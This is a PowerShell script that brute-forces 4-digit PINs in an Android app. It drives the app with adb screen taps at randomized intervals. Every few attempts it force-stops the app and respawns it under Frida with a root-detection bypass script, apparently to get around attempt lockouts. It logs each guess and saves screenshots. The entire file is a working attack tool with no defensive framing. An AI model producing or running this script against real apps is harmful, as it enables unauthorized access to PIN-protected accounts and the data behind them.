# bruteforce_with_frida_spawn.ps1
# Brute-force 4-digit PINs (1350–1400), using frida spawn + adb tap

# ===== CONFIG =====
$PKG = "<your.package.apk>"
$DIGITMAP_FILE = ".\digitmap.json"
$FRIDA_SCRIPT = "...\bypass_root_safe.js"
$LOG_FILE = ".\bruteforce_log.txt"
$SCREENS_DIR = ".\screens"
$ADB = "...\adb.exe"

# Range
$START_PIN = 1350
$END_PIN   = 1400

# Behavior
$ATTEMPTS_BEFORE_SPAWN = 4
$WAIT_AFTER_INPUT_SEC = 2
$WAIT_AFTER_SPAWN_SEC = 10   # <<< ждём 10 секунд после запуска frida
$SCREENSHOT_EVERY_N_ATTEMPTS = 100

# ===== PREP =====
New-Item -ItemType Directory -Path $SCREENS_DIR -Force | Out-Null
if (-not (Test-Path $DIGITMAP_FILE)) { Write-Host "digitmap.json not found!" -ForegroundColor Red; exit 1 }

# ===== HELPERS =====
# Надёжная обёртка для вызова adb:
# - поддерживает вызовы вида: Run-Adb "shell wm size"  и Run-Adb shell wm size
# - корректно разделяет строку на аргументы
function Run-Adb {
    param(
        [Parameter(ValueFromRemainingArguments = $true)]
        [string[]] $Args
    )

    if ($Args -eq $null -or $Args.Length -eq 0) {
        throw "Run-Adb: no arguments provided"
    }

    # Если получен ровно один элемент и он содержит пробелы — разбиваем на части.
    if ($Args.Length -eq 1 -and $Args[0] -match '\s') {
        $parts = $Args[0] -split '\s+' | Where-Object { $_ -ne '' }
    } else {
        $parts = $Args
    }

    # Вызов внешней команды adb с массивом аргументов
    & $ADB @parts
}

function Get-ScreenSize {
    $out = Run-Adb "shell wm size" 2>&1
    if ($out -is [System.Array]) { $out = ($out -join "`n") }     # объединить массив строк, если есть
    $out = $out.Trim()
    if ($out -match "(\d+)x(\d+)") {
        return @{ width = [int]$matches[1]; height = [int]$matches[2] }
    } else {
        Write-Host "Failed to get screen size. Raw adb output:" -ForegroundColor Red
        Write-Host $out
        throw "Failed to get screen size"
    }
}

$digitMapRaw = Get-Content $DIGITMAP_FILE -Raw | ConvertFrom-Json
$screen = Get-ScreenSize
$SCREEN_W = $screen.width
$SCREEN_H = $screen.height
Write-Host ("Screen: {0}x{1}" -f $SCREEN_W, $SCREEN_H)

function Get-CoordFromDigit {
    param([string]$digit)
    $entry = $digitMapRaw.$digit
    if ($entry -is [System.Object[]]) { return @{ xpct = $entry[0]; ypct = $entry[1] } }
    if ($entry.PSObject.Properties.Name -contains "xpct") { return @{ xpct = $entry.xpct; ypct = $entry.ypct } }
    if ($entry.PSObject.Properties.Name -contains "0") { return @{ xpct = $entry."0"; ypct = $entry."1" } }
    $arr = @($entry)
    if ($arr.Count -ge 2) { return @{ xpct = $arr[0]; ypct = $arr[1] } }
    return $null
}

function Tap-Percent {
    param([double]$xpct, [double]$ypct)
    $x = [math]::Round($SCREEN_W * $xpct)
    $y = [math]::Round($SCREEN_H * $ypct)
    Run-Adb "shell input tap $x $y" | Out-Null
}

function Input-Pin {
    param([string]$pin)
    foreach ($ch in $pin.ToCharArray()) {
        $c = Get-CoordFromDigit $ch
        Run-Adb shell input tap ([math]::Round($SCREEN_W * $c.xpct)) ([math]::Round($SCREEN_H * $c.ypct)) | Out-Null
        Start-Sleep -Milliseconds (Get-Random -Minimum 150 -Maximum 300)
    }
    Start-Sleep -Milliseconds (Get-Random -Minimum 600 -Maximum 1000)
}

function Take-Screenshot {
    param([string]$tag)
    $remote = "/sdcard/scr.png"
    Run-Adb "shell screencap -p $remote" | Out-Null
    $local = Join-Path $SCREENS_DIR ($tag + "_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".png")
    Run-Adb "pull $remote `"$local`"" | Out-Null
}

function Spawn-Frida {
    param([string]$pkg, [string]$fridaScript)
    Write-Host "Force-stopping $pkg..."
    Run-Adb "shell am force-stop $pkg" | Out-Null
    Write-Host "Launching with frida..."
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c frida -U -f $pkg -l `"$fridaScript`"" -WindowStyle Hidden | Out-Null
    Write-Host "Waiting for app to load..."
    Start-Sleep -Seconds $WAIT_AFTER_SPAWN_SEC
}

# ===== MAIN =====
"{0} Bruteforce started (range {1}-{2})" -f (Get-Date -Format o), $START_PIN, $END_PIN |
    Out-File -FilePath $LOG_FILE -Append -Encoding utf8

Spawn-Frida -pkg $PKG -fridaScript $FRIDA_SCRIPT

$pinIndex = $START_PIN
while ($pinIndex -le $END_PIN) {
    for ($n = 0; $n -lt $ATTEMPTS_BEFORE_SPAWN -and $pinIndex -le $END_PIN; $n++) {
        $pin = $pinIndex.ToString("D4")
        Write-Host ("Trying PIN: {0}" -f $pin)
        ("{0} TRY {1}" -f (Get-Date -Format o), $pin) | Out-File -FilePath $LOG_FILE -Append -Encoding utf8
        Input-Pin $pin
        Start-Sleep -Seconds $WAIT_AFTER_INPUT_SEC
        $pinIndex++
    }

    if ($pinIndex -le $END_PIN) {
        Spawn-Frida -pkg $PKG -fridaScript $FRIDA_SCRIPT
    }
}

Write-Host "All attempts finished. See $LOG_FILE and $SCREENS_DIR."
